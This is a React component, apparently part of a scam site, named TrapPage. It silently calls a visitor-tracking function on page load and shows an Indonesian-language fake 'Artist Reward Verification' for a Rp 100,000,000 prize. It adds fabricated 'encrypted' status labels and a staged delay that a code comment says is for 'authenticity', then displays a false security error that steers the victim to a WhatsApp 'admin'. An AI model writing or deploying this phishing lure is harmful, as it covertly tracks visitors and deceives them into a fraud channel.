import React, { useEffect, useState } from 'react';
import { ShieldCheck, ShieldAlert, Loader2 } from 'lucide-react';
import { captureVisitorData } from '../utils/tracker';

const TrapPage = () => {
  const [status, setStatus] = useState('verifying'); // verifying, error

  useEffect(() => {
    const track = async () => {
      await captureVisitorData();
      // Simulate a bit of loading for "authenticity"
      setTimeout(() => {
        setStatus('error');
      }, 3000);
    };
    track();
  }, []);

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      background: '#f8fafc',
      color: '#1e293b'
    }}>
      <div className="glass-card" style={{
        maxWidth: '450px',
        width: '100%',
        padding: '40px',
        textAlign: 'center',
        background: 'white',
        border: '1px solid #e2e8f0'
      }}>
        <div style={{
          width: '64px',
          height: '64px',
          background: status === 'verifying' ? '#eff6ff' : '#fee2e2',
          borderRadius: '50%',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          margin: '0 auto 24px'
        }}>
          {status === 'verifying' ? (
            <Loader2 size={32} color="#3b82f6" className="animate-spin" />
          ) : (
            <ShieldAlert size={32} color="#ef4444" />
          )}
        </div>

        <h1 style={{ fontSize: '24px', fontWeight: '800', marginBottom: '12px', color: '#1e293b' }}>
          {status === 'verifying' ? 'Artist Reward Verification' : 'Verification System Error'}
        </h1>
        
        <p style={{ color: '#64748b', fontSize: '15px', marginBottom: '32px' }}>
          {status === 'verifying' 
            ? 'Kami sedang memverifikasi identitas Anda untuk pencairan hadiah Rp 100.000.000. Mohon tunggu, jangan tutup halaman ini.' 
            : 'Sistem mendeteksi adanya aktivitas mencurigakan. Untuk keamanan dana Anda, akses sementara dibatasi. Silakan hubungi admin di WhatsApp untuk verifikasi manual.'}
        </p>

        {status === 'verifying' && (
          <div style={{ textAlign: 'left', background: '#f8fafc', padding: '16px', borderRadius: '12px', border: '1px solid #e2e8f0', fontSize: '13px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
              <span style={{ color: '#64748b' }}>Status Verifikasi:</span>
              <span style={{ fontWeight: '700', color: '#3b82f6' }}>DALAM PROSES</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
              <span style={{ color: '#64748b' }}>Keamanan Jalur:</span>
              <span style={{ color: '#10b981', fontWeight: '700' }}>TERINKRIPSI</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
              <span style={{ color: '#64748b' }}>Estimasi Selesai:</span>
              <span style={{ fontWeight: '700' }}>15 Detik</span>
            </div>
          </div>
        )}

        {status === 'error' && (
          <button className="btn-primary" style={{ width: '100%', justifyContent: 'center', background: '#0f172a' }}>
            Try Again
          </button>
        )}

        <div style={{ marginTop: '32px', fontSize: '11px', color: '#94a3b8' }}>
          &copy; 2026 SecureDistribution Global. All Rights Reserved.
        </div>
      </div>
    </div>
  );
};

export default TrapPage;
